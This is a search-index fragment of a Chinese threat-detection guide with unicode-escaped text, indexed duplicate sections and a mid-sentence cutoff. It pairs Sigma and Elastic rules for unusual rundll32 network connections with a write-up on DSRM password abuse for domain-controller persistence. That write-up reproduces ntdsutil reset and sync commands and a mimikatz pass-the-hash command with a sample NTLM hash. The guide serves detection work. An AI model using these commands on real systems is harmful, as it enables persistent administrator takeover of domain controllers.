\u901a\u8fc7windows\u65e5\u5fd7\u6765\u68c0\u6d4b\u901a\u8fc7Rundll32\u7684\u5f02\u5e38\u7f51\u7edc\u94fe\u63a5\u884c\u4e3a status: experimental references: - https://www.elastic.co/guide/en/siem/guide/current/unusual-network-connection-via-rundll32.html tags: - attack.defense_evasion - attack.execution - attack.T1085 - attack.TA0002 date: 2020/12/2 logsource: category: process_creation product: windows detection: selection1: EventID: 5156 Process.name: 'rundll32.exe' #Application Name selection2: Destination Address: - 10.0.0.0/8 - 172.16.0.0/12 - 192.168.0.0/16 condition: selection1 and not selection2 level: low","title":"sigma"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E9%80%9A%E8%BF%87Rundll32%E7%9A%84%E5%BC%82%E5%B8%B8%E7%BD%91%E7%BB%9C%E9%93%BE%E6%8E%A5/#elastic-rule-query","text":"process.name:rundll32.exe and event.action:\"Network connection detected (rule: NetworkConnect)\" and not destination.ip:(10.0.0.0/8 or 172.16.0.0/12 or 192.168.0.0/16 or 127.0.0.0/8)","title":"Elastic rule query"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E9%80%9A%E8%BF%87Rundll32%E7%9A%84%E5%BC%82%E5%B8%B8%E7%BD%91%E7%BB%9C%E9%93%BE%E6%8E%A5/#_6","text":"\u901a\u8fc7\u8fdb\u7a0b\u76d1\u63a7\u6765\u68c0\u6d4b\u548c\u5206\u6790rundll32.exe\u7684\u6267\u884c\u548c\u53c2\u6570\u3002\u6bd4\u8f83rundll32.exe\u7684\u8fd1\u671f\u8c03\u7528\u4e0e\u5386\u53f2\u5df2\u77e5\u5408\u6cd5\u53c2\u6570\u53ca\u5df2\u52a0\u8f7d\u52a8\u6001\u94fe\u63a5\u5e93\u6765\u786e\u5b9a\u662f\u5426\u6709\u5f02\u5e38\u548c\u6f5c\u5728\u7684\u653b\u51fb\u6d3b\u52a8\u3002\u5728rundll32.exe\u8c03\u7528\u4e4b\u524d\u548c\u4e4b\u540e\u4f7f\u7528\u7684\u547d\u4ee4\u53c2\u6570\u4e5f\u53ef\u7528\u4e8e\u786e\u5b9a\u6b63\u5728\u52a0\u8f7d\u7684\u52a8\u6001\u94fe\u63a5\u5e93\u7684\u6765\u6e90\u548c\u76ee\u7684\u3002","title":"\u5efa\u8bae"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E9%80%9A%E8%BF%87Rundll32%E7%9A%84%E5%BC%82%E5%B8%B8%E7%BD%91%E7%BB%9C%E9%93%BE%E6%8E%A5/#_7","text":"MITRE-ATT&CK-T1218-011 https://attack.mitre.org/techniques/T1218/011/ \u901a\u8fc7Rundll32\u7684\u5f02\u5e38\u7f51\u7edc\u94fe\u63a5 https://www.elastic.co/guide/en/siem/guide/current/unusual-network-connection-via-rundll32.html","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1078-001-win-DSRM%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81/","text":"T1078-001-win-DSRM\u5bc6\u7801\u91cd\u7f6e \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528\u51ed\u636e\u8bbf\u95ee\u6280\u672f\u7a83\u53d6\u7279\u5b9a\u7528\u6237\u6216\u670d\u52a1\u8d26\u53f7\u7684\u51ed\u636e\uff0c\u6216\u8005\u5728\u4fa6\u5bdf\u8fc7\u7a0b\u7684\u65e9\u671f\u901a\u8fc7\u793e\u4f1a\u5de5\u7a0b\u6355\u83b7\u51ed\u636e\u4ee5\u83b7\u5f97\u9996\u6b21\u8bbf\u95ee\u6743\u9650\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u4e09\u79cd\u8d26\u53f7\uff1a\u9ed8\u8ba4\u8d26\u53f7\u3001\u672c\u5730\u8d26\u53f7\u548c\u57df\u8d26\u53f7\u3002\u9ed8\u8ba4\u8d26\u53f7\u662f\u64cd\u4f5c\u7cfb\u7edf\u7684\u5185\u7f6e\u8d26\u53f7\uff0c\u4f8b\u5982Windows\u7cfb\u7edf\u4e0a\u7684\u8bbf\u5ba2\u6216\u7ba1\u7406\u5458\u8d26\u53f7\uff0c\u6216\u8005\u5176\u4ed6\u7c7b\u578b\u7cfb\u7edf\u3001\u8f6f\u4ef6\u6216\u8bbe\u5907\u4e0a\u7684\u9ed8\u8ba4\u5de5\u5382/\u63d0\u4f9b\u5546\u8d26\u53f7\u3002\u672c\u5730\u8d26\u53f7\u662f\u7ec4\u7ec7\u914d\u7f6e\u7ed9\u7528\u6237\u3001\u8fdc\u7a0b\u652f\u6301\u6216\u670d\u52a1\u7684\u8d26\u53f7\uff0c\u6216\u5355\u4e2a\u7cfb\u7edf/\u670d\u52a1\u7684\u7ba1\u7406\u8d26\u53f7\u3002\u57df\u8d26\u53f7\u662fAD-DS\uff08\u6d3b\u52a8\u76ee\u5f55\u57df\u670d\u52a1\uff09\u7ba1\u7406\u7684\u8d26\u53f7\uff0c\u5176\u8bbf\u95ee\u548c\u6743\u9650\u5728\u57df\u5185\u4e0d\u540c\u7cfb\u7edf\u548c\u670d\u52a1\u4e4b\u95f4\u914d\u7f6e\u3002\u57df\u8d26\u53f7\u53ef\u4ee5\u6db5\u76d6\u7528\u6237\u3001\u7ba1\u7406\u5458\u548c\u670d\u52a1\u3002 \u6d4b\u8bd5\u6848\u4f8b \u76ee\u5f55\u8fd8\u539f\u6a21\u5f0f\u8d26\u6237 \u6bcf\u4e00\u4e2a\u57df\u63a7\u5236\u5668\u90fd\u6709\u4e00\u4e2a\u672c\u5730\u7ba1\u7406\u5458\u8d26\u6237\u5176\u5b9e\u4e5f\u5c31\u662f\u6240\u8c13\u7684\u76ee\u5f55\u670d\u52a1\u8fd8\u539f\u6a21\u5f0f\uff08DSRM\uff09\u8d26\u6237\u3002DSRM\u7684\u5bc6\u7801\u662f\u5728DC\u5b89\u88c5\u7684\u65f6\u5019\u5c31\u9700\u8981\u8bbe\u7f6e\uff0c\u5e76\u4e14\u5f88\u5c11\u4f1a\u88ab\u91cd\u7f6e\u3002\u4fee\u6539DSRM\u5bc6\u7801\u6700\u57fa\u672c\u7684\u65b9\u6cd5\u662f\u5728DC\u4e0a\u8fd0\u884cntdsutil\u547d\u4ee4\u884c\u5de5\u5177\u3002 \u5728\u5b89\u88c5\u4e86KB961320\u8865\u4e01\u7684Windows Server 2008\u4ee5\u53ca\u4e4b\u540e\u53d1\u5e03\u7684Windows Server\u4e2d\uff0c\u5f00\u59cb\u652f\u6301\u5728DC\u4e0a\u4f7f\u7528\u6307\u5b9a\u7684\u57df\u5e10\u6237\u540c\u6b65DSRM\u5bc6\u7801\u3002\u4f46\u662f\u8fd9\u4e2a\u540c\u6b65\u64cd\u4f5c\u662f\u4e00\u6b21\u6027\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\u4f60\u5fc5\u987b\u5728\u6bcf\u6b21\u66f4\u6539\u4e86DSRM\u5bc6\u7801\u540e\u8fdb\u884c\u4e00\u6b21\u5bc6\u7801\u540c\u6b65\u3002 \u5982\u679c\u4e00\u4e2a\u653b\u51fb\u8005\u53ef\u4ee5\u5f97\u5230\u8fd0\u884c\u5728Windows Server 2008 R2\u6216 Windows Server 2012 R2\uff08DsrmAdminLogonBehavior\u7684\u503c\u4e3a2\uff09\u7684\u57df\u63a7\u7684DSRM\u8d26\u6237\u5bc6\u7801\u6216\u8005HASH\u503c\uff0c\u90a3\u4e48DSRM\u8d26\u6237\u5c31\u53ef\u4ee5\u88ab\u7528\u4e8e\u201cHASH\u4f20\u9012\u653b\u51fb\u201d\u65b9\u5f0f\u3002\u8fd9\u5c31\u4f7f\u5f97\u653b\u51fb\u8005\u53ef\u4ee5\u4fdd\u6301\u57df\u63a7\u5236\u5668\u7684\u7ba1\u7406\u5458\u6743\u9650\uff0c\u5373\u4f7f\u6240\u6709\u7684\u57df\u7528\u6237\u548c\u8ba1\u7b97\u673a\u5bc6\u7801\u88ab\u4fee\u6539\u4e86\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows\u5b89\u5168\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 0x00 \u66f4\u6539DSRM\u8d26\u53f7\u5bc6\u7801 \u6267\u884c\u4ee5\u4e0b\u547d\u4ee4(DC\u4e0a) NTDSUTIL set dsrm password reset password on server null <PASSWORD> Q Q \u5b9e\u9645\u6d4b\u8bd5\u7ed3\u679c\uff1a C:\\Users\\Administrator>ntdsutil ntdsutil: set dsrm password \u91cd\u7f6e DSRM \u7ba1\u7406\u5458\u5bc6\u7801: reset password on server null \u8bf7\u952e\u5165 DS \u8fd8\u539f\u6a21\u5f0f Administrator \u5e10\u6237\u7684\u5bc6\u7801: ********* \u8bf7\u786e\u8ba4\u65b0\u5bc6\u7801: ********* \u5bc6\u7801\u8bbe\u7f6e\u6210\u529f\u3002 \u91cd\u7f6e DSRM \u7ba1\u7406\u5458\u5bc6\u7801: Q ntdsutil: Q 0x01 \u4f7f\u7528\u57df\u5e10\u6237\u540c\u6b65DSRM\u8d26\u6237\u5bc6\u7801 \u4f7f\u7528\u57df\u7ba1\u7406\u5458\u5e10\u6237\u767b\u5f55DC\u540e\uff0c\u542f\u52a8\u4e00\u4e2a\u201c\u53d6\u5f97\u7ba1\u7406\u5458\u6743\u9650\u201d\u7684CMD\uff0c\u8fd0\u884c\u5982\u4e0b\u547d\u4ee4\u884c\uff1a NTDSUTIL SET DSRM PASSWORD SYNC FROM DOMAIN ACCOUNT <your user here> Q Q 0x02 \u4f7f\u7528DSRM\u4f5c\u4e3a\u6d3b\u52a8\u76ee\u5f55\u7684\u540e\u95e8 \u6709\u5173DSRM\u5bc6\u7801\u7684\u4e00\u4e2a\u6709\u610f\u601d\u7684\u4e8b\u60c5\u662f\u8fd9\u4e2aDSRM\u8d26\u6237\u5b9e\u9645\u4e0a\u5c31\u662f\u201cAdministrator\u201d\u3002\u8fd9\u5c31\u610f\u5473\u7740\u4e00\u65e6\u653b\u51fb\u8005\u6709\u4e86DC\u7684DSRM\u5bc6\u7801\uff0c\u5c31\u6709\u53ef\u80fd\u4f7f\u7528\u8fd9\u4e2a\u8d26\u6237\u901a\u8fc7\u7f51\u7edc\u4f5c\u4e3a\u4e00\u4e2a\u672c\u5730\u7ba1\u7406\u5458\u767b\u5f55\u5230DC\u4e0a\u3002 \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u6cd5\u56fd\u4f6c\u795e\u5668\uff08mimikatz\uff09\u6765\u786e\u8ba4DSRM\u8d26\u53f7\u5c31\u662f\u672c\u5730\u7ba1\u7406\u5458\u5e10\u6237\u3002\u9996\u5148\uff0c\u4f7f\u7528\u4e00\u4e2a\u5df2\u77e5\u7684\u5bc6\u7801\u521b\u5efa\u4e00\u4e2aAD\u7528\u6237\uff08xiaomi\uff09\uff0c\u4e4b\u540e\uff0c\u4f7f\u7528\u8fd9\u4e2a\u57df\u8d26\u6237\u8fdb\u884cDSRM\u5bc6\u7801\u540c\u6b65\u64cd\u4f5c\u3002 \u5177\u4f53\u64cd\u4f5c\u547d\u4ee4\u53ef\u4ee5\u53c2\u80030x01\u547d\u4ee4 \u5173\u4e8e\u66f4\u591a\u4f7f\u7528DSRM\u4f5c\u4e3a\u6d3b\u52a8\u76ee\u5f55\u540e\u95e8\u7684\u7528\u6cd5\u53ef\u4ee5\u53c2\u8003Freebuf\u6587\u4e2d\u63d0\u5230\u65b9\u6cd5\u3002 0x03 \u4f7f\u7528DSRM\u51ed\u8bc1\u7684\u4e00\u79cd\u66f4\u4e3a\u9ad8\u7ea7\u7684\u65b9\u6cd5 \u6b63\u59820x02\u6240\u8ff0\uff0cDSRM\u8d26\u6237\u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a\u53ef\u7528\u7684\u672c\u5730\u7ba1\u7406\u5458\u8d26\u6237\uff0c\u5e76\u4e14\u53ef\u4ee5\u901a\u8fc7\u7f51\u7edc\u9a8c\u8bc1\u5e76\u767b\u5f55\u5230DC\u4e2d\uff0c\u5f53\u7136\uff0c \u8981\u786e\u4fddDsrmAdminLogonBehavior\u6ce8\u518c\u8868\u952e\u7684\u503c\u4e3a 2 \u3002\u53e6\u5916\uff0c\u653b\u51fb\u8005\u5e76\u4e0d\u9700\u8981\u77e5\u9053DSRM\u8d26\u6237\u7684\u771f\u5b9e\u5bc6\u7801\uff0c\u53ea\u9700\u8981\u77e5\u9053\u8fd9\u4e2a\u8d26\u6237\u7684HASH\u503c\u3002\u8fd9\u5c31\u610f\u5473\u7740\u4e00\u65e6\u653b\u51fb\u8005\u6709\u4e86DSRM\u8d26\u6237\u7684HASH\u503c\uff0c\u5c31\u53ef\u4ee5\u901a\u8fc7\u7f51\u7edc\u4f7f\u7528\u201cHASH\u4f20\u9012\u653b\u51fb\u201d\u65b9\u5f0f\uff0c\u5e76\u4ee5\u4e00\u4e2a\u7ba1\u7406\u5458\u7684\u8eab\u4efd\u8bbf\u95eeDC\u3002\u8fd9\u4e2a\u65b9\u6cd5\u5728Windows Server 2008 R2\u548cWindows Server 2012 R2\u7684\u57df\u63a7\u4e2d\u5df2\u7ecf\u6d4b\u8bd5\u6210\u529f\u4e86\u3002 \u4f7f\u7528\u6cd5\u56fd\u4f6c\u795e\u5668\uff08mimikatz\uff09\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u884c\uff1a Mimikatz \u201cprivilege::debug\u201d \u201csekurlsa::pth /domain:xiaomi.org /user:administrator /ntlm:7c08d63a2f48f045971bc2236ed3f3ac\u201d exit \u6ce8\u610f\u7684\u662f\uff1a\u7531\u4e8eDSRM\u8d26\u6237\u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a\u53ef\u7528\u7684\u672c\u5730\u7ba1\u7406\u5458\u8d26\u6237administrator\uff0c\u6240\u4ee5\u5728\u6b64\u5904\uff0c\u53ef\u4ee5\u8fd9\u4e48\u7406\u89e3\uff0c\u653b\u51fb\u8005\u77e5\u9053DC\u672c\u5730\u8d26\u6237administrator\u7684NTML HASH\uff0c\u4f7f\u7528mimikatz\u8fdb\u884cHASH\u4f20\u9012\u8fdb\u884c\u653b\u51fb\uff0c\u8fbe\u5230\u4ee5DC\u672c\u5730\u8d26\u6237administrator\u7684\u5bc6\u7801\u8fdb\u884c\u767b\u5f55\u8bbf\u95eeDC\u3002 \u6d4b\u8bd5\u7559\u75d5 windows \u5b89\u5168\u65e5\u5fd74794 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def Sigma\u89c4\u5219 title: \u76ee\u5f55\u670d\u52a1\u8fd8\u539f\u6a21\u5f0f\uff08DSRM\uff09\u5e10\u6237\u4e0a\u7684\u5bc6\u7801\u66f4\u6539 status: \u7a33\u5b9a description: \u76ee\u5f55\u670d\u52a1\u8fd8\u539f\u6a21\u5f0f\uff08DSRM\uff09\u5e10\u6237\u662f\u57df\u63a7\u5236\u5668\u4e0a\u7684\u672c\u5730\u7ba1\u7406\u5458\u5e10\u6237\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u66f4\u6539\u5bc6\u7801\u4ee5\u83b7\u5f97\u6301\u4e45\u6027\u3002 references: - https://adsecurity.org/?p=1714 tags: - attack.persistence - attack.privilege_escalation - attack.t1098 logsource: product: windows service: security detection: selection: EventID: 4794 #\u8bd5\u56fe\u8bbe\u7f6e\u76ee\u5f55\u670d\u52a1\u8fd8\u539f\u6a21\u5f0f\u7ba1\u7406\u5458\u5bc6\u7801 condition: selection falsepositives: - Initial installation of a domain controller level: high \u5efa\u8bae 1.\u76d1\u63a7\u4e0eDSRM\u5bc6\u7801\u91cd\u7f6e\u548c\u4f7f\u7528\u76f8\u5173\u7684\u4e8b\u4ef6\u65e5\u5fd7 4794\uff1a\u8bd5\u56fe\u8bbe\u7f6e\u76ee\u5f55\u670d\u52a1\u8fd8\u539f\u6a21\u5f0f\u7ba1\u7406\u5458\u5bc6\u7801\u3002 2.\u76d1\u63a7\u5982\u4e0b\u6ce8\u518c\u8868\u4f4d\u7f6e\u7684\u503c\uff0c\u5f53\u503c\u4e3a 1 \u6216 2\u65f6\uff0c\u5e94\u5f15\u8d77\u8b66\u793a HKLM\\System\\CurrentControlSet\\Control\\Lsa\\DSRMAdminLogonBehavior \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1078-001 https://attack.mitre.org/techniques/T1078/001/ \u57df\u63a7\u6743\u9650\u6301\u4e45\u5316\u4e4bDSRM https://www.freebuf.com/articles/system/80968.html \u5de7\u7528DSRM\u5bc6\u7801\u540c\u6b65\u5c06\u57df\u63a7\u6743\u9650\u6301\u4e45\u5316 https://www.uedbox.com/post/10269/","title":"T1078-001-win-DSRM\u5bc6\u7801\u91cd\u7f6e"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1078-001-win-DSRM%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81/#t1078-001-win-dsrm","text":"","title":"T1078-001-win-DSRM\u5bc6\u7801\u91cd\u7f6e"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1078-001-win-DSRM%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528\u51ed\u636e\u8bbf\u95ee\u6280\u672f\u7a83\u53d6\u7279\u5b9a\u7528\u6237\u6216\u670d\u52a1\u8d26\u53f7\u7684\u51ed\u636e\uff0c\u6216\u8005\u5728\u4fa6\u5bdf\u8fc7\u7a0b\u7684\u65e9\u671f\u901a\u8fc7\u793e\u4f1a\u5de5\u7a0b\u6355\u83b7\u51ed\u636e\u4ee5\u83b7\u5f97\u9996\u6b21\u8bbf\u95ee\u6743\u9650\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u4e09\u79cd\u8d26\u53f7\uff1a\u9ed8\u8ba4\u8d26\u53f7\u3001\u672c\u5730\u8d26\u53f7\u548c\u57df\u8d26\u53f7\u3002\u9ed8\u8ba4\u8d26\u53f7\u662f\u64cd\u4f5c\u7cfb\u7edf\u7684\u5185\u7f6e\u8d26\u53f7\uff0c\u4f8b\u5982Windows\u7cfb\u7edf\u4e0a\u7684\u8bbf\u5ba2\u6216\u7ba1\u7406\u5458\u8d26\u53f7\uff0c\u6216\u8005\u5176\u4ed6\u7c7b\u578b\u7cfb\u7edf\u3001\u8f6f\u4ef6\u6216\u8bbe\u5907\u4e0a\u7684\u9ed8\u8ba4\u5de5\u5382/\u63d0\u4f9b\u5546\u8d26\u53f7\u3002\u672c\u5730\u8d26\u53f7\u662f\u7ec4\u7ec7\u914d\u7f6e\u7ed9\u7528\u6237\u3001\u8fdc\u7a0b\u652f\u6301\u6216\u670d\u52a1\u7684\u8d26\u53f7\uff0c\u6216\u5355\u4e2a\u7cfb\u7edf/\u670d\u52a1\u7684\u7ba1\u7406\u8d26\u53f7\u3002\u57df\u8d26\u53f7\u662fAD-DS\uff08\u6d3b\u52a8\u76ee\u5f55\u57df\u670d\u52a1\uff09\u7ba1\u7406\u7684\u8d26\u53f7\uff0c\u5176\u8bbf\u95ee\u548c\u6743\u9650\u5728\u57df\u5185\u4e0d\u540c\u7cfb\u7edf\u548c\u670d\u52a1\u4e4b\u95f4\u914d\u7f6e\u3002\u57df\u8d26\u53f7\u53ef\u4ee5\u6db5\u76d6\u7528\u6237\u3001\u7ba1\u7406\u5458\u548c\u670d\u52a1\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1078-001-win-DSRM%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81/#_1","text":"\u76ee\u5f55\u8fd8\u539f\u6a21\u5f0f\u8d26\u6237 \u6bcf\u4e00\u4e2a\u57df\u63a7\u5236\u5668\u90fd\u6709\u4e00\u4e2a\u672c\u5730\u7ba1\u7406\u5458\u8d26\u6237\u5176\u5b9e\u4e5f\u5c31\u662f\u6240\u8c13\u7684\u76ee\u5f55\u670d\u52a1\u8fd8\u539f\u6a21\u5f0f\uff08DSRM\uff09\u8d26\u6237\u3002DSRM\u7684\u5bc6\u7801\u662f\u5728DC\u5b89\u88c5\u7684\u65f6\u5019\u5c31\u9700\u8981\u8bbe\u7f6e\uff0c\u5e76\u4e14\u5f88\u5c11\u4f1a\u88ab\u91cd\u7f6e\u3002\u4fee\u6539DSRM\u5bc6\u7801\u6700\u57fa\u672c\u7684\u65b9\u6cd5\u662f\u5728DC\u4e0a\u8fd0\u884cntdsutil\u547d\u4ee4\u884c\u5de5\u5177\u3002 \u5728\u5b89\u88c5\u4e86KB961320\u8865\u4e01\u7684Windows Server 2008\u4ee5\u53ca\u4e4b\u540e\u53d1\u5e03\u7684Windows Server\u4e2d\uff0c\u5f00\u59cb\u652f\u6301\u5728DC\u4e0a\u4f7f\u7528\u6307\u5b9a\u7684\u57df\u5e10\u6237\u540c\u6b65DSRM\u5bc6\u7801\u3002\u4f46\u662f\u8fd9\u4e2a\u540c\u6b65\u64cd\u4f5c\u662f\u4e00\u6b21\u6027\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\u4f60\u5fc5\u987b\u5728\u6bcf\u6b21\u66f4\u6539\u4e86DSRM\u5bc6\u7801\u540e\u8fdb\u884c\u4e00\u6b21\u5bc6\u7801\u540c\u6b65\u3002 \u5982\u679c\u4e00\u4e2a\u653b\u51fb\u8005\u53ef\u4ee5\u5f97\u5230\u8fd0\u884c\u5728Windows Server 2008 R2\u6216 Windows Server 2012 R2\uff08DsrmAdminLogonBehavior\u7684\u503c\u4e3a2\uff09\u7684\u57df\u63a7\u7684DSRM\u8d26\u6237\u5bc6\u7801\u6216\u8005HASH\u503c\uff0c\u90a3\u4e48DSRM\u8d26\u6237\u5c31\u53ef\u4ee5\u88ab\u7528\u4e8e\u201cHASH\u4f20\u9012\u653b\u51fb\u201d\u65b9\u5f0f\u3002\u8fd9\u5c31\u4f7f\u5f97\u653b\u51fb\u8005\u53ef\u4ee5\u4fdd\u6301\u57df\u63a7\u5236\u5668\u7684\u7ba1\u7406\u5458\u6743\u9650\uff0c\u5373\u4f7f\u6240\u6709\u7684\u57df\u7528\u6237\u548c\u8ba1\u7b97\u673a\u5bc6\u7801\u88ab\u4fee\u6539\u4e86\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1078-001-win-DSRM%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81/#_2","text":"windows\u5b89\u5168\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1078-001-win-DSRM%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81/#_3","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1078-001-win-DSRM%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81/#0x00-dsrm","text":"\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4(DC\u4e0a) NTDSUTIL set dsrm password reset password on server null <PASSWORD> Q Q \u5b9e\u9645\u6d4b\u8bd5\u7ed3\u679c\uff1a C:\\Users\\Administrator>ntdsutil ntdsutil: set dsrm password \u91cd\u7f6e DSRM \u7ba1\u7406\u5458\u5bc6\u7801: reset password on server null \u8bf7\u952e\u5165 DS \u8fd8\u539f\u6a21\u5f0f Administrator \u5e10\u6237\u7684\u5bc6\u7801: ********* \u8bf7\u786e\u8ba4\u65b0\u5bc6\u7801: ********* \u5bc6\u7801\u8bbe\u7f6e\u6210\u529f\u3002 \u91cd\u7f6e DSRM \u7ba1\u7406\u5458\u5bc6\u7801: Q ntdsutil: Q","title":"0x00 \u66f4\u6539DSRM\u8d26\u53f7\u5bc6\u7801"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1078-001-win-DSRM%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81/#0x01-dsrm","text":"\u4f7f\u7528\u57df\u7ba1\u7406\u5458\u5e10\u6237\u767b\u5f55DC\u540e\uff0c\u542f\u52a8\u4e00\u4e2a\u201c\u53d6\u5f97\u7ba1\u7406\u5458\u6743\u9650\u201d\u7684CMD\uff0c\u8fd0\u884c\u5982\u4e0b\u547d\u4ee4\u884c\uff1a NTDSUTIL SET DSRM PASSWORD SYNC FROM DOMAIN ACCOUNT <your user here> Q Q","title":"0x01 \u4f7f\u7528\u57df\u5e10\u6237\u540c\u6b65DSRM\u8d26\u6237\u5bc6\u7801"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1078-001-win-DSRM%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81/#0x02-dsrm","text":"\u6709\u5173DSRM\u5bc6\u7801\u7684\u4e00\u4e2a\u6709\u610f\u601d\u7684\u4e8b\u60c5\u662f\u8fd9\u4e2aDSRM\u8d26\u6237\u5b9e\u9645\u4e0a\u5c31\u662f\u201cAdministrator\u201d\u3002\u8fd9\u5c31\u610f\u5473\u7740\u4e00\u65e6\u653b\u51fb\u8005\u6709\u4e86DC\u7684DSRM\u5bc6\u7801\uff0c\u5c31\u6709\u53ef\u80fd\u4f7f\u7528\u8fd9\u4e2a\u8d26\u6237\u901a\u8fc7\u7f51\u7edc\u4f5c\u4e3a\u4e00\u4e2a\u672c\u5730\u7ba1\u7406\u5458\u767b\u5f55\u5230DC\u4e0a\u3002 \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u6cd5\u56fd\u4f6c\u795e\u5668\uff08mimikatz\uff09\u6765\u786e\u8ba4DSRM\u8d26\u53f7\u5c31\u662f\u672c\u5730\u7ba1\u7406\u5458\u5e10\u6237\u3002\u9996\u5148\uff0c\u4f7f\u7528\u4e00\u4e2a\u5df2\u77e5\u7684\u5bc6\u7801\u521b\u5efa\u4e00\u4e2aAD\u7528\u6237\uff08xiaomi\uff09\uff0c\u4e4b\u540e\uff0c\u4f7f\u7528\u8fd9\u4e2a\u57df\u8d26\u6237\u8fdb\u884cDSRM\u5bc6\u7801\u540c\u6b65\u64cd\u4f5c\u3002 \u5177\u4f53\u64cd\u4f5c\u547d\u4ee4\u53ef\u4ee5\u53c2\u80030x01\u547d\u4ee4 \u5173\u4e8e\u66f4\u591a\u4f7f\u7528DSRM\u4f5c\u4e3a\u6d3b\u52a8\u76ee\u5f55\u540e\u95e8\u7684\u7528\u6cd5\u53ef\u4ee5\u53c2\u8003Freebuf\u6587\u4e2d\u63d0\u5230\u65b9\u6cd5\u3002","title":"0x02 \u4f7f\u7528DSRM\u4f5c\u4e3a\u6d3b\u52a8\u76ee\u5f55\u7684\u540e\u95e8"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1078-001-win-DSRM%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81/#0x03-dsrm","text":"\u6b63\u59820x02\u6240\u8ff0\uff0cDSRM\u8d26\u6237\u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a\u53ef\u7528\u7684\u672c\u5730\u7ba1\u7406\u5458\u8d26\u6237\uff0c\u5e76\u4e14\u53ef\u4ee5\u901a\u8fc7\u7f51\u7edc\u9a8c\u8bc1\u5e76\u767b\u5f55\u5230DC\u4e2d\uff0c\u5f53\u7136\uff0c \u8981\u786e\u4fddDsrmAdminLogonBehavior\u6ce8\u518c\u8868\u952e\u7684\u503c\u4e3a 2 \u3002\u53e6\u5916\uff0c\u653b\u51fb\u8005\u5e76\u4e0d\u9700\u8981\u77e5\u9053DSRM\u8d26\u6237\u7684\u771f\u5b9e\u5bc6\u7801\uff0c\u53ea\u9700\u8981\u77e5\u9053\u8fd9\u4e2a\u8d26\u6237\u7684HASH\u503c\u3002\u8fd9\u5c31\u610f\u5473\u7740\u4e00\u65e6\u653b\u51fb\u8005\u6709\u4e86DSRM\u8d26\u6237\u7684HASH\u503c\uff0c\u5c31\u53ef\u4ee5\u901a\u8fc7\u7f51\u7edc\u4f7f\u7528\u201cHASH\u4f20\u9012\u653b\u51fb\u201d\u65b9\u5f0f\uff0c\u5e76\u4ee5\u4e00\u4e2a\u7ba1\u7406\u5458\u7684\u8eab\u4efd\u8bbf\u95eeDC\u3002\u8fd9\u4e2a\u65b9\u6cd5\u5728Windows Server 2008 R2\u548cWindows Server 2012 R2\u7684\u57df\u63a7\u4e2d\u5df2\u7ecf\u6d4b\u8bd5\u6210\u529f\u4e86\u3002 \u4f7f\u7528\u6cd5\u56fd\u4f6c\u795e\u5668\uff08mimikatz\uff09\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u884c\uff1a Mimikatz \u201cprivilege::debug\u201d \u201csekurlsa::pth /domain:xiaomi.org /user:administrator /ntlm:7c08d63a2f48f045971bc2236ed3f3ac\u201d exit \u6ce8\u610f\u7684\u662f\uff1a\u7531\u4e8eDSRM\u8d26\u6237\u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a\u53ef\u7528\u7684\u672c\u5730\u7ba1\u7406\u5458\u8d26\u6237administrator\uff0c\u6240\u4ee5\u5728\u6b64\u5904\uff0c\u53ef\u4ee5\u8fd9\u4e48\u7406\u89e3\uff0c\u653b\u51fb\u8005\u77e5\u9053DC\u672c\u5730\u8d26\u6237administrator\u7684NTML 